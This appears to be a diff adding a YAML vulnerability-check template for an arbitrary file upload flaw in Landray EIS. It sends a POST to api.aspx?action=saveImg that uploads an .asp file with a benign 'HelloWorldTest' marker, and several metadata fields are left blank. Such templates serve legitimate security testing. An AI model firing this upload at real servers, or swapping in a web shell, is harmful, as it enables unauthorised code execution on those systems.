@@ -1,0 +1,29 @@
+id:
+
+info:
+  name: 蓝凌EIS api.aspx任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /eis/service/api.aspx?action=saveImg
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    Content-Length: 152
+    Content-Type: multipart/form-data; boundary=---4362487482487434839348798
+    Connection: close
+  data: |
+    -----4362487482487434839348798
+    Content-Disposition: form-data; name="file"; filename="ceshi.asp"
+    Content-Type: text/html
+
+    <%Response.Write("HelloWorldTest")%>
+    -----4362487482487434839348798--
+response1:
+  headers:
+  body: asp
+  code: 200
+requests2:
+response2:
